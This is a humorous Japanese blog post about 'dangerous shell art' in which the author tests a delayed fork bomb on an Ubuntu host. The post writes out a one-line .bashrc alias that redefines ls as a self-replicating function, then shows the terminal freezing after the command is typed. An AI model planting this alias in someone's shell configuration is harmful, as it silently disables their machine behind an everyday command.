# 時間差フォーク爆弾の提案と実行 #危険シェル芸
本日は大変痛ましい事故が起こりました。私を訪ねてきた学生さんが一人、危険シェル芸の犠牲になりました。最大のリスクは生きることです。社会人になったら誰も守ってくれません。強く生きましょう。<br />
<br />
さて、その後始末の時に、時間差危険シェル芸（より正確には時間差フォーク爆弾）を思いつきました。<br />
<br />
アイデアはこんな感じ。過去に同じことを考えた人はいるでしょうが・・・。<br />
<br />
<ul><br />
 <li>ステップ1: .bashrc等にフォーク爆弾の関数を仕込んでおく（lsとかそういう人気のある名前で）</li><br />
 <li>ステップ2: lsと打つ。</li><br />
 <li>ステップ3: 死ぬ。</li><br />
</ul><br />
<br />
<br />
<h2>検証</h2><br />
<br />
やってみました。VMで・・・と言いたいところですが、ノートPCを買い換えた時にVMを消してしまいました。某Ubuntu環境でやります。<span style="color:red">ツッコミは厳禁。</span><br />
<br />
ログインしたら、.bashrcの一番下に次のように書きます。書き間違えると不発弾になって後世に迷惑がかかるのでやめましょう（消せよ）。<br />
<br />
[bash]<br />
ueda\@remote:~$ tail -n 1 .bashrc <br />
alias ls='ls(){ ls | ls &amp;} ; ls'<br />
[/bash]<br />
<br />
一度ログアウト。sourceしてもいいのですが、ログイン即身成仏を狙います。<br />
<br />
ということでログインして即実行。<br />
<br />
[bash]<br />
ueda\@remote:~$ ls<br />
[1] 18531<br />
ueda\@remote:~$ <br />
[1]+ 終了 ls | ls<br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
<br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ <br />
ueda\@remote:~$ vi .bashr<br />
（消息を断つ。）<br />
[/bash]<br />
<br />
大成功。ちょっとログ等で確認が取れませんが・・・。<br />
<br />
<span style="color:red">.bashrcからエイリアスを消した直後、まだ設定が残っているのに間違ってlsを打ってしまい再度死んだのは秘密にする。</span><br />
<br />
<br />
帰る。というか今横須賀線車内・・・。<br />
<br />
<br />
何をやっているのか。
